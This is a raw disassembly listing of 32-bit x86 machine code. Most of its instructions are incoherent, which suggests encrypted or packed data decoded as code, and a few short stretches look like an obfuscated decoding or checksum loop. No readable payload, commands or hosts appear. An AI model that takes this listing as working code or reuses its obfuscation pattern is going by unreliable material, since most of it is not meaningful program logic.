  4072cd:	xchg   BYTE PTR [esi+0x61],bh
  4072d0:	inc    esp
  4072d1:	push   ss
  4072d2:	lods   eax,DWORD PTR ds:[esi]
  4072d3:	gs push es
  4072d5:	add    eax,DWORD PTR [esi]
  4072d7:	sbb    BYTE PTR [ecx+0x3cf2cf35],ah
  4072dd:	sbb    BYTE PTR [ebx+0x3512d81e],0xf6
  4072e4:	xor    dh,al
  4072e6:	sub    eax,0xa36932e9
  4072eb:	dec    esp
  4072ec:	push   edi
  4072ed:	dec    ebx
  4072ee:	sbb    al,0xf4
  4072f0:	shr    BYTE PTR [eax],1
  4072f2:	pusha  
  4072f3:	cmp    BYTE PTR [ecx-0x19],0x40
  4072f7:	jmp    0x8b5b1328
  4072fc:	xor    edx,DWORD PTR [edx+eax*2]
  4072ff:	les    edi,FWORD PTR [edi-0x74f0114b]
  407305:	(bad)  
  407306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407307:	mov    bh,0x2d
  407309:	(bad)  
  40730a:	rcl    dh,1
  40730c:	sub    BYTE PTR [eax+0x27],ch
  40730f:	daa    
  407310:	push   0x4972a6d
  407315:	mov    eax,DWORD PTR [ebp-0x8]
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x4306c6
  40732a:	sub    DWORD PTR ds:0x43061a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e8e2,0x43062a
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x430636,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x4502235c]
  40736c:	aad    0x2f
  40736e:	sub    cl,BYTE PTR [ecx]
  407370:	iret   
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x4073e4
  407378:	inc    esp
  407379:	and    al,0x10
  40737b:	iret   
  40737c:	repz ret 0xe4e9
  407380:	fiadd  DWORD PTR [ecx+eax*4+0x1c14fe0c]
  407387:	rcr    BYTE PTR [ecx+0x4e],0x6d
  40738b:	jle    0x407324
  40738d:	mov    edi,0xbe4b7baa
  407392:	retf   
  407393:	cmp    BYTE PTR [edi],0x33
  407396:	in     al,0x82
  407398:	test   BYTE PTR ds:0x64b3c653,dh
  40739e:	je     0x4073ef
  4073a0:	xchg   esp,eax
  4073a1:	mov    ebx,0x79264e45
  4073a6:	lock xchg BYTE PTR [edx],dl
  4073a9:	nop
  4073aa:	sbb    eax,0x885d6eff
  4073af:	aam    0xd0
  4073b1:	xchg   esp,eax
  4073b2:	mov    dl,0x54
  4073b4:	ret    0xf0a
  4073b7:	ins    DWORD PTR es:[edi],dx
  4073b8:	in     al,0x5
  4073ba:	pusha  
  4073bb:	sub    eax,0x978b57d
  4073c0:	cmp    al,0xdf
  4073c2:	stos   DWORD PTR es:[edi],eax
  4073c3:	xchg   ebx,eax
  4073c4:	mov    esi,0x6d1e28fe
  4073c9:	dec    esp
  4073ca:	sbb    ebx,DWORD PTR [esi-0x5dd28b53]
  4073d0:	push   0xcbf2ef73
  4073d5:	push   0x17
  4073d7:	mov    ecx,0x95c28548
  4073dc:	test   BYTE PTR [eax-0x55],dh
  4073df:	mov    cl,0x1d
  4073e1:	fcomp  QWORD PTR [eax]
  4073e3:	xchg   edx,eax
  4073e4:	in     eax,dx
  4073e5:	pop    eax
  4073e6:	jbe    0x407412
  4073e8:	xchg   edx,eax
  4073e9:	or     BYTE PTR [eax],bh
  4073eb:	test   al,0x5e
  4073ed:	outs   dx,BYTE PTR ds:[esi]
  4073ee:	stos   BYTE PTR es:[edi],al
  4073ef:	test   BYTE PTR [ebx+ebp*4+0x20],dh
  4073f3:	xchg   BYTE PTR [esi],dl
  4073f5:	shl    edx,0x18
  4073f8:	mov    ah,dl
  4073fa:	mov    ds:0x922885a9,eax
  4073ff:	das    
  407400:	mov    DWORD PTR [ebx],ebp
  407402:	lods   al,BYTE PTR ds:[esi]
  407403:	push   eax
  407404:	retf   0xf351
  407407:	das    
  407408:	and    al,0x67
  40740a:	dec    ebx
  40740b:	xlat   BYTE PTR ds:[ebx]
  40740c:	dec    esi
  40740d:	push   cs
  40740e:	(bad)  
  40740f:	jnp    0x4073a6
  407411:	sti    
  407412:	cwde   
  407413:	ficom  WORD PTR [ecx]
  407415:	inc    edi
  407416:	add    al,0xf7
  407418:	xlat   BYTE PTR ds:[ebx]
  407419:	dec    edi
  40741a:	inc    ecx
  40741b:	adc    DWORD PTR [ebx+0x16385d1b],esi
  407421:	lods   al,BYTE PTR ds:[esi]
  407422:	outs   dx,BYTE PTR ds:[esi]
  407423:	test   bl,0xc9
  407426:	test   ecx,ecx
  407428:	pop    ecx
  407429:	iret   
  40742a:	lds    esp,FWORD PTR [ebx-0x6adb659f]
  407430:	and    BYTE PTR [ebp+0x33],al
  407433:	jp     0x407489
  407435:	dec    edi
  407436:	or     cl,BYTE PTR [edi]
  407438:	leave  
  407439:	pop    ss
  40743a:	mov    BYTE PTR [esi+0x791e86e1],0xb2
  407441:	cld    
  407442:	shr    dh,1
  407444:	clc    
  407445:	dec    eax
  407446:	int3   
  407447:	lock jae 0x4074bd
  40744a:	jmp    0x1060:0xb99e0131
  407451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407452:	and    al,0x91
  407454:	push   edx
  407455:	into   
  407456:	popf   
  407457:	push   0xfffffff2
  407459:	nop
  40745a:	inc    esi
  40745b:	jmp    0x517d:0x3545
  407461:	out    dx,al
  407462:	jge    0x6a40edba
  407468:	vpaddusw ymm0,ymm1,YMMWORD PTR [ebp-0xe]
  40746d:	loopne 0x4074dd
  40746f:	push   0xfe370f2c
  407474:	or     ah,bl
  407476:	sbb    DWORD PTR [edi],0xfffffffb
  407479:	(bad)  
  40747a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40747b:	in     al,0x8d
  40747d:	call   0xe12:0xd91a5978
  407484:	imul   esi,DWORD PTR [edi+0x5b],0x3f
  407488:	cmp    al,bl
  40748a:	mov    ?,WORD PTR [edx]
  40748c:	inc    esp
  40748d:	jp     0x4074ab
  40748f:	pushf  
  407490:	jmp    0x407421
  407492:	jmp    0x40744f
  407494:	cmp    DWORD PTR ds:0xde9d1193,esi
  40749a:	sahf   
  40749b:	inc    ebx
  40749c:	xor    eax,DWORD PTR [esi]
  40749e:	retf   
  40749f:	push   edx
  4074a0:	inc    esp
  4074a1:	pop    esi
  4074a2:	(bad)  [ecx+0xf]
  4074a5:	sbb    al,BYTE PTR gs:[ebx]
  4074a8:	sbb    ebx,eax
  4074aa:	lahf   
  4074ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ac:	mov    cl,0xd9
  4074ae:	int    0x49
  4074b0:	clc    
  4074b1:	out    dx,eax
  4074b2:	(bad)  
  4074b3:	in     al,dx
  4074b4:	mov    ebp,0x12da9f9d
  4074b9:	push   ebx
  4074ba:	sub    al,0x7b
  4074bc:	les    edx,FWORD PTR [edx+0x2a]
  4074bf:	fwait
  4074c0:	xchg   ecx,eax
  4074c1:	fistp  WORD PTR [edx]
  4074c3:	ror    BYTE PTR [esi+0x64],0x8c
  4074c7:	sbb    al,cl
  4074c9:	or     bl,bh
  4074cb:	mov    WORD PTR [edi+eax*8-0x47],?
  4074cf:	mov    BYTE PTR [edi-0x4ed55e4c],bh
  4074d5:	shr    BYTE PTR ss:[edx],1
  4074d8:	ret    
  4074d9:	js     0x4074ff
  4074db:	cmp    eax,0x40
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	or     ecx,DWORD PTR [edi-0x3f124066]
  40750f:	jle    0x40758f
  407511:	sar    BYTE PTR [edi+0x7e],cl
  407514:	jle    0x4074f5
  407516:	cmp    BYTE PTR [ebp+0x35],dl
  407519:	ret    0xef9a
  40751c:	mov    dl,0xd3
  40751e:	cmc    
  40751f:	rol    DWORD PTR cs:[esi+ebx*8],0x8d
  407524:	push   0xdc4f5bd1
  407529:	scas   al,BYTE PTR es:[edi]
  40752a:	dec    ebx
  40752b:	repz popa 
  40752d:	nop
  40752e:	mov    dl,al
  407530:	xor    edi,DWORD PTR ds:0x683443ad
  407536:	setns  BYTE PTR ds:0xbb357de7
  40753d:	xchg   edx,eax
  40753e:	add    ebx,DWORD PTR [ebx]
  407540:	jp     0x40750f
  407542:	adc    BYTE PTR [ebp-0x14],cl
  407545:	and    esp,DWORD PTR [ecx+eax*8-0x7fe43364]
  40754c:	iret   
  40754d:	pop    ebp
  40754e:	aaa    
  40754f:	pop    ecx
  407550:	mov    ch,0xa4
  407552:	inc    esp
  407553:	xchg   esi,eax
  407554:	fld    TBYTE PTR [eax]
  407556:	xchg   DWORD PTR [ecx+0x59],esp
  407559:	cmc    
  40755a:	jb     0x4075b7
  40755c:	mov    esi,DWORD PTR [edi+ebx*8-0x41]
  407560:	xchg   esp,eax
  407561:	jge    0x407587
  407563:	jbe    0x4075be
  407565:	repz push eax
  407567:	push   ecx
  407568:	sub    ecx,esp
  40756a:	outs   dx,DWORD PTR ds:[esi]
  40756b:	dec    edi
  40756c:	xchg   edx,eax
  40756d:	pop    es
  40756e:	retf   0x7ad5
  407571:	fisub  WORD PTR [edi]
  407573:	dec    esi
  407574:	clc    
  407575:	xor    eax,0x980d3a0d
  40757a:	imul   eax,DWORD PTR [ecx],0x721244f1
  407580:	ret    
  407581:	adc    al,0x2f
  407583:	mov    bl,0x6
  407585:	adc    eax,0xb10446d8
  40758a:	je     0x407547
  40758c:	das    
  40758d:	in     eax,dx
  40758e:	and    bh,BYTE PTR [edi]
  407590:	mov    cs,WORD PTR [ecx+0x5216b56a]
  407596:	and    BYTE PTR [ebx+ebx*2-0x3c783c03],bl
  40759d:	daa    
  40759e:	ret    
  40759f:	cli    
  4075a0:	sbb    dh,al
  4075a2:	xchg   BYTE PTR [esi],bl
  4075a4:	ja     0x4075c7
  4075a6:	adc    DWORD PTR ds:0xab32d5a3,ecx
  4075ac:	mov    bl,0xf6
  4075ae:	or     al,0xa9
  4075b0:	mov    eax,0x5936fdca
  4075b5:	mov    cs,ebx
  4075b7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4075b9:	fimul  DWORD PTR [edx]
  4075bb:	cmp    dl,BYTE PTR [ebx-0x7f]
  4075be:	fidivr WORD PTR [edx]
  4075c0:	push   ss
  4075c1:	adc    edi,DWORD PTR [ebp+0x75]
  4075c4:	sbb    edi,DWORD PTR [ebx+ecx*2-0x37]
  4075c8:	cmc    
  4075c9:	xchg   ecx,eax
  4075ca:	imul   eax,esi,0xfffffff2
  4075cd:	push   ecx
  4075ce:	jl     0x4075ad
  4075d0:	fimul  WORD PTR [edi]
  4075d2:	xchg   esp,eax
  4075d3:	arpl   WORD PTR [edx-0x4e],di
  4075d6:	push   cs
  4075d7:	pop    esi
  4075d8:	mov    eax,0x48bd4f79
  4075dd:	cmp    DWORD PTR [edi-0x2],ebp
  4075e0:	cs aad 0x3b
  4075e3:	pop    es
  4075e4:	push   esp
  4075e5:	test   al,0xc5
  4075e7:	jns    0x407588
  4075e9:	in     al,0x2a
  4075eb:	addr16 cmp eax,ebp
  4075ee:	mov    DWORD PTR [esi-0x23],edx
  4075f1:	jmp    0x1634:0xd9101e89
  4075f8:	int    0x3c
  4075fa:	into   
  4075fb:	mov    DWORD PTR [edi],edi
  4075fd:	dec    DWORD PTR [ecx+edi*4]
  407600:	xlat   BYTE PTR ds:[ebx]
  407601:	jl     0x4075c5
  407603:	ds cli 
  407605:	test   eax,0x4ac94469
  40760a:	mov    ecx,0x5e24b1ee
  40760f:	prefetch BYTE PTR [edx-0x58]
  407613:	xchg   edx,eax
  407614:	jp     0x4075b4
  407616:	mov    al,0x7c
  407618:	aad    0x2f
  40761a:	pop    esp
  40761b:	in     eax,dx
  40761c:	jo     0x4075a2
  40761e:	shl    DWORD PTR [eax+0x63],0x1
  407622:	sbb    edi,0x158ae256
  407628:	jno    0x40763e
  40762a:	scas   al,BYTE PTR es:[edi]
  40762b:	loopne 0x40762f
  40762d:	cdq    
  40762e:	fidivr DWORD PTR [esp+ecx*4-0x69]
  407632:	scas   al,BYTE PTR es:[edi]
  407633:	(bad)  
  407635:	div    DWORD PTR [edx+esi*4-0xa]
  407639:	lods   eax,DWORD PTR ds:[esi]
  40763a:	jg     0x407631
  40763c:	sahf   
  40763d:	jg     0x407601
  40763f:	jecxz  0x407601
  407641:	sub    DWORD PTR [esi+esi*1],ebx
  407644:	call   0x34f1b3c8
  407649:	xchg   ebx,eax
  40764a:	xor    bh,BYTE PTR [ecx-0x4e]
  40764d:	test   eax,0x4c2c2fb4
  407652:	dec    edx
  407653:	daa    
  407654:	ret    
  407655:	test   BYTE PTR ds:0xfe6a9fcb,bl
  40765b:	jge    0x407685
  40765d:	inc    esp
  40765e:	cld    
  40765f:	xor    edx,DWORD PTR [esp+ecx*1+0x28930540]
  407666:	fcmove st,st(5)
  407668:	stos   DWORD PTR es:[edi],eax
  407669:	xchg   edx,eax
  40766a:	out    0x1f,eax
  40766c:	pop    es
  40766d:	imul   eax,DWORD PTR [edi-0x70],0x6f
  407671:	test   DWORD PTR [edi],ebx
  407673:	add    DWORD PTR [edx-0x4d],eax
  407676:	xor    al,0xc2
  407678:	mov    ds:0xe9087d8b,eax
  40767d:	jl     0x407680
  40767f:	add    BYTE PTR [eax],al
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	dec    esi
  40768e:	sub    BYTE PTR [ebp-0x3b],bl
  407691:	inc    ecx
  407692:	sar    DWORD PTR [esi+0x7e],0xd2
  407696:	jg     0x407716
  407698:	jle    0x407713
  40769a:	mov    edi,0x21e882cc
  40769f:	into   
  4076a0:	popa   
  4076a1:	mov    bh,0xc7
  4076a3:	ss xor bh,dl
  4076a6:	sahf   
  4076a7:	out    0x67,al
  4076a9:	mul    DWORD PTR [eax+0x181b2191]
  4076af:	sub    ah,BYTE PTR [eax+0xc18218b]
  4076b5:	enter  0x6326,0x7a
  4076b9:	jb     0x40764c
  4076bb:	push   ebx
  4076bc:	imul   esi,DWORD PTR [ebx+ebp*4-0x7a],0xf
  4076c1:	outs   dx,BYTE PTR ds:[esi]
  4076c2:	ins    DWORD PTR es:[edi],dx
  4076c3:	loopne 0x4076a0
  4076c5:	mov    ds:0x3e6a0fc0,al
  4076ca:	dec    cl
  4076cc:	fs inc esp
  4076ce:	lds    ebx,FWORD PTR [ebx-0x56]
  4076d1:	ret    0x57a9
  4076d4:	push   edx
  4076d5:	je     0x4076e1
  4076d7:	in     al,dx
  4076d8:	ficomp DWORD PTR [edx+0x7ab251f9]
  4076de:	xchg   esi,eax
  4076df:	pop    esi
  4076e0:	push   ebx
  4076e1:	repnz and dl,BYTE PTR [ebx-0x38]
  4076e5:	imul   ebx,edx,0x8f2930a4
  4076eb:	sbb    ebx,DWORD PTR [ebp+0x442eca3d]
  4076f1:	jnp    0x407684
  4076f3:	int3   
  4076f4:	leave  
  4076f5:	pop    es
  4076f6:	loopne 0x4076b9
  4076f8:	pop    edx
  4076f9:	nop
  4076fa:	mov    dh,BYTE PTR [ecx-0x1304a6c5]
  407700:	popf   
  407701:	inc    ebp
  407702:	xor    DWORD PTR gs:[esp+edx*1+0x166cfba3],0x20
  40770b:	repnz xchg esi,eax
  40770d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770e:	or     al,0x8a
  407710:	sub    ch,ah
  407712:	fadd   st,st(0)
  407714:	dec    esp
  407715:	and    cl,BYTE PTR [esi]
  407717:	repz and eax,0x183af75c
  40771d:	cmp    dh,al
  40771f:	mov    edx,DWORD PTR [ebp-0x69448cb1]
  407725:	mov    al,0xce
  407727:	cmc    
  407728:	sahf   
  407729:	push   eax
  40772a:	ss jnp 0x40778f
  40772d:	fs pop ss
  40772f:	pop    edx
  407730:	and    al,0xde
  407732:	bound  edi,QWORD PTR [ebx+ebx*1-0x67]
  407736:	dec    esp
  407737:	ss add al,0x45
  40773a:	mov    ds:0x11c482a6,eax
  40773f:	adc    ecx,DWORD PTR [eax+0x56]
  407742:	pop    es
  407743:	add    al,0x59
  407745:	jg     0x4076c7
  407747:	jo     0x40777f
  407749:	cmp    al,al
  40774b:	push   ss
  40774c:	enter  0x157f,0x65
  407750:	imul   ebx,DWORD PTR [ecx],0xffffff9e
  407753:	cmp    eax,0x249c039d
  407758:	jmp    0x575ce38c
  40775d:	rcl    DWORD PTR [ebx],1
  40775f:	sub    BYTE PTR [ecx+eax*1],ah
  407762:	cdq    
  407763:	sbb    edi,DWORD PTR [ecx]
  407765:	setnp  BYTE PTR [eax+ebx*4+0x53f005fe]
  40776d:	push   0x70441070
  407772:	mov    ?,edx
  407774:	call   DWORD PTR [ebx+ebp*2+0x43]
  407778:	xor    eax,0xb0297114
  40777d:	sub    bl,BYTE PTR [eax-0x1f]
  407780:	in     al,0x80
  407782:	int    0x3f
  407784:	popa   
  407785:	daa    
  407786:	in     eax,0xee
  407788:	and    al,0x83
  40778a:	sbb    BYTE PTR [edx+0x5f],0xb
  40778e:	stos   DWORD PTR es:[edi],eax
  40778f:	cmc    
  407790:	push   es
  407791:	pop    eax
  407792:	xor    eax,0x1c55b46b
  407797:	js     0x40773c
  407799:	push   ecx
  40779a:	in     eax,0x5b
  40779c:	push   edi
  40779d:	inc    ecx
  40779e:	jbe    0x407747
  4077a0:	push   ebp
  4077a1:	cmp    BYTE PTR [edx+0x65],ah
  4077a4:	inc    edx
  4077a5:	mov    al,0x3c
  4077a7:	ds jae 0x40779f
  4077aa:	outs   dx,DWORD PTR ds:[esi]
  4077ab:	shl    DWORD PTR [ecx-0x33],0xd5
  4077af:	out    dx,al
  4077b0:	and    edx,ecx
  4077b2:	xor    eax,0xe00d1dc1
  4077b7:	add    ah,dh
  4077b9:	ins    DWORD PTR es:[edi],dx
  4077ba:	shr    DWORD PTR [edx],cl
  4077bc:	xchg   DWORD PTR [ecx-0x35],ebx
  4077bf:	xor    BYTE PTR [esi+0x6487adb6],bh
  4077c5:	jne    0x407761
  4077c7:	mov    dl,0x7b
  4077c9:	popf   
  4077ca:	inc    esp
  4077cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077cc:	jne    0x407830
  4077ce:	add    ah,BYTE PTR [edi]
  4077d0:	out    dx,eax
  4077d1:	inc    ecx
  4077d2:	add    BYTE PTR [edx+0x29],al
  4077d5:	or     esp,eax
  4077d7:	xchg   ebp,eax
  4077d8:	arpl   WORD PTR [eax-0x385c3c7d],si
  4077de:	aam    0xc7
  4077e0:	mov    esi,0x6dcf0b1e
  4077e5:	fimul  WORD PTR [eax+0x3ef8a463]
  4077eb:	dec    esp
  4077ec:	mov    bh,0x37
  4077ee:	pop    ds
  4077ef:	jecxz  0x40779c
  4077f1:	jg     0x407790
  4077f3:	add    dl,al
  4077f5:	and    BYTE PTR [eax],bl
  4077f7:	jle    0x407781
  4077f9:	inc    esi
  4077fa:	inc    ecx
  4077fb:	add    ch,BYTE PTR [eax]
  4077fd:	mov    eax,0x8a40
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	test   DWORD PTR [ecx-0x3cda76e7],esp
  407826:	jle    0x4078a6
  407828:	sar    BYTE PTR [edi+0x7e],cl
  40782b:	jle    0x407856
  40782d:	leave  
  40782e:	jmp    0x407856
  407830:	pop    ecx
  407831:	jl     0x4077f2
  407833:	or     edi,DWORD PTR [edx-0x7c09b268]
  407839:	test   eax,0x6b2d0924
  40783e:	in     eax,dx
  40783f:	je     0x40780b
  407841:	mov    al,0xa3
  407843:	mov    dl,0x55
  407845:	scas   eax,DWORD PTR es:[edi]
  407846:	inc    esp
  407847:	or     ah,ch
  407849:	mov    ss,WORD PTR es:[ebx]
  40784c:	pop    edx
  40784d:	xchg   esp,eax
  40784e:	inc    esi
  40784f:	fmul   QWORD PTR [edi+0x6653f8c5]
  407855:	xor    eax,0x5f784367
  40785a:	adc    al,0xec
  40785c:	push   ss
  40785d:	stc    
  40785e:	or     DWORD PTR [esi],ecx
  407860:	push   ebp
  407861:	adc    ebx,DWORD PTR [eax+0x5e3f0533]
  407867:	pop    es
  407868:	pop    esp
  407869:	mov    DWORD PTR [ebx],esi
  40786b:	pusha  
  40786c:	fcmovne st,st(2)
  40786e:	stc    
  40786f:	lock rcl DWORD PTR [edi-0x16bf0cbe],1
  407876:	xor    al,0x97
  407878:	daa    
  407879:	addr16 rcr bl,cl
  40787c:	jge    0x40782e
  40787e:	xor    BYTE PTR [ecx+0x52],bh
  407881:	mov    ebx,0xd7e9c1e0
  407886:	push   0x63f13a71
  40788b:	hlt    
  40788c:	dec    esi
  40788d:	pushf  
  40788e:	cwde   
  40788f:	aaa    
  407890:	aaa    
  407891:	jmp    0x40784b
  407893:	cdq    
  407894:	int3   
  407895:	jmp    0x11a09bdb
  40789a:	xchg   esp,eax
  40789b:	dec    ebp
  40789c:	in     eax,dx
  40789d:	and    eax,0x79d32eb
  4078a2:	call   0x58852531
  4078a7:	stos   DWORD PTR es:[edi],eax
  4078a8:	dec    edx
  4078a9:	sub    esp,DWORD PTR [ebp-0x72a976bf]
  4078af:	in     al,dx
  4078b0:	inc    edi
  4078b1:	push   cs
  4078b2:	dec    edi
  4078b3:	dec    esp
  4078b4:	mov    dx,0x9691
  4078b8:	les    edi,FWORD PTR [ecx]
  4078ba:	sub    eax,0xd14ef627
  4078bf:	push   eax
  4078c0:	xchg   edx,eax
  4078c1:	mov    dl,0x27
  4078c3:	inc    ecx
  4078c4:	fstp   TBYTE PTR [ecx-0xbcbf343]
  4078ca:	cmp    al,0x63
  4078cc:	mov    ecx,ds
  4078ce:	add    BYTE PTR [edx+0x0],dh
  4078d1:	sub    eax,0xa37d6e25
  4078d6:	mov    cl,BYTE PTR ds:0xb13eb100
  4078dc:	dec    BYTE PTR [ebp+ebp*8+0x1ad3e7ce]
  4078e3:	sbb    DWORD PTR [ebx-0x4a],ecx
  4078e6:	pop    esp
  4078e7:	xor    BYTE PTR [esp+edi*4],ah
  4078ea:	mov    eax,0x48ebd203
  4078ef:	fiadd  DWORD PTR [eax-0xd]
  4078f2:	sub    eax,0xb601da83
  4078f7:	adc    al,BYTE PTR [ecx+edi*4-0x21]
  4078fb:	jge    0x4078fa
  4078fd:	rol    DWORD PTR [edx+0x4da4bf27],0x70
  407904:	test   al,0x87
  407906:	and    eax,DWORD PTR [esi]
  407908:	test   esp,edi
  40790a:	cmc    
  40790b:	cmp    esp,DWORD PTR [ecx]
  40790d:	leave  
  40790e:	xor    BYTE PTR ds:0x4141cbe9,bl
  407914:	mov    fs:0xbf494688,al
  40791a:	and    BYTE PTR [esi+0x73],dl
  40791d:	cld    
  40791e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40791f:	adc    BYTE PTR [eax+0x19],cl
  407922:	sbb    DWORD PTR [ecx+0x6ecd98bb],ebx
  407928:	out    0x8b,al
  40792a:	cmc    
  40792b:	not    BYTE PTR [ecx]
  40792d:	sub    bh,BYTE PTR es:[ebp-0x54ee8531]
  407934:	push   ebx
  407935:	mov    dl,0x81
  407937:	aaa    
  407938:	(bad)  
  407939:	shl    BYTE PTR [eax-0xd],0xb6
  40793d:	adc    ch,BYTE PTR [ecx+edi*8+0x2a5507e8]
  407944:	(bad)  
  407945:	mov    eax,0xfd58f9ab
  40794a:	dec    eax
  40794b:	xor    al,0x5d
  40794d:	sub    eax,0xaf2cf521
  407952:	jnp    0x407973
  407954:	fidiv  WORD PTR [esi]
  407956:	bound  esi,QWORD PTR [ecx]
  407958:	imul   edi,DWORD PTR [ecx],0xffffffc0
  40795b:	mov    dh,0xce
  40795d:	test   DWORD PTR [ecx+0x13],eax
  407960:	inc    ebp
  407961:	fnsave [eax+0xcf6a2dc]
  407967:	adc    dh,BYTE PTR [edi-0x1f196040]
  40796d:	lds    ebp,FWORD PTR [ecx*1-0x4ad2818e]
  407974:	sub    DWORD PTR [esi+0x3d50ca77],edx
  40797a:	call   0x3d59:0x5d191e27
  407981:	pop    ds
  407982:	stos   DWORD PTR es:[edi],eax
  407983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407984:	mov    esp,esp
  407986:	int    0xb9
  407988:	mov    dh,0xd
  40798a:	jo     0x407a05
  40798c:	(bad)  
  40798d:	stc    
  40798e:	mov    ebp,0xc0b70ffd
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	dec    esi
  4079a8:	imul   esp,DWORD PTR [ebp+0x7ec4993f],0x7e
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x407984
  4079b4:	pop    ebp
  4079b5:	dec    edi
  4079b6:	xor    dh,al
  4079b8:	push   0xffffff9a
  4079ba:	in     eax,0x87
  4079bc:	fisub  DWORD PTR [edx-0x761c325b]
  4079c2:	cmc    
  4079c3:	shr    BYTE PTR [eax+0x3a],1
  4079c6:	test   eax,0x773dc996
  4079cb:	xchg   ecx,eax
  4079cc:	div    DWORD PTR [ebx+0x41b13c1c]
  4079d2:	jp     0x407a41
  4079d4:	mov    al,ds:0xb827c466
  4079d9:	or     cl,BYTE PTR [edx]
  4079db:	xchg   DWORD PTR [ecx],edx
  4079dd:	xor    eax,0x6313aae1
  4079e2:	in     al,dx
  4079e3:	out    0xcb,al
  4079e5:	mov    esi,0xc497b787
  4079ea:	outs   dx,BYTE PTR ds:[esi]
  4079eb:	scas   al,BYTE PTR es:[edi]
  4079ec:	pop    eax
  4079ed:	(bad)  
  4079ee:	xor    al,0x45
  4079f0:	xor    dh,BYTE PTR ds:0xda0b9eb7
  4079f6:	inc    edi
  4079f7:	(bad)  
  4079f8:	hlt    
  4079f9:	xchg   edx,eax
  4079fa:	ret    
  4079fb:	(bad)  
  4079fc:	xlat   BYTE PTR ds:[ebx]
  4079fd:	js     0x407a4a
  4079ff:	dec    ebx
  407a00:	jns    0x4079c6
  407a02:	ss ret 
  407a04:	into   
  407a05:	out    0xf1,al
  407a07:	xchg   esp,eax
  407a08:	fiadd  WORD PTR [esi-0x78]
  407a0b:	fst    QWORD PTR [ebx+ecx*8]
  407a0e:	mov    esp,0xa0a3a406
  407a13:	stos   DWORD PTR es:[edi],eax
  407a14:	in     eax,0x28
  407a16:	dec    edx
  407a17:	dec    ebp
  407a18:	idiv   BYTE PTR [eax+0x2605b691]
  407a1e:	sbb    esi,esp
  407a20:	mov    WORD PTR [edi],es
  407a22:	pushf  
  407a23:	sti    
  407a24:	jl     0x407a2d
  407a26:	add    dh,ah
  407a28:	(bad)  
  407a2a:	bound  ebx,QWORD PTR [esi-0x68]
  407a2d:	mov    ecx,0xd329d81
  407a32:	hlt    
  407a33:	call   0x8ed5b2e3
  407a38:	and    al,0x74
  407a3a:	jle    0x407a4f
  407a3c:	and    BYTE PTR [ebp-0x2d4ce8db],bh
  407a42:	inc    ecx
  407a43:	mov    ebx,0x66c9fda5
  407a48:	jb     0x407a73
  407a4a:	adc    BYTE PTR [edi+ebx*4-0x4],al
  407a4e:	add    BYTE PTR ds:0x9c08469d,0x77
  407a55:	jb     0x4079d9
  407a57:	mov    dl,0x45
  407a59:	fsubp  st(3),st
  407a5b:	dec    edx
  407a5c:	push   0xdab36e4e
  407a61:	fidiv  WORD PTR [esi-0x4ad63259]
  407a67:	pop    ss
  407a68:	push   esp
  407a69:	sbb    eax,0x203f6c32
  407a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a6f:	mov    eax,ds:0xf3041eba
  407a74:	gs stos DWORD PTR es:[edi],eax
  407a76:	inc    edi
  407a77:	aaa    
  407a78:	cld    
  407a79:	cdq    
  407a7a:	lea    edi,[ecx]
  407a7c:	mov    BYTE PTR [ecx+0x16],dl
  407a7f:	push   esi
  407a80:	sbb    eax,0x7c40ce68
  407a85:	imul   BYTE PTR [ecx-0x613edf8a]
  407a8b:	sbb    dh,BYTE PTR [ebx+edx*2+0x5f]
  407a8f:	arpl   WORD PTR [edx-0x7fa04d4a],ax
  407a95:	mov    al,ds:0x2d09388f
  407a9a:	aam    0x59
  407a9c:	mov    esp,DWORD PTR [ecx+eax*4-0x1e40bf0f]
  407aa3:	cdq    
  407aa4:	dec    dh
  407aa6:	in     al,0x6
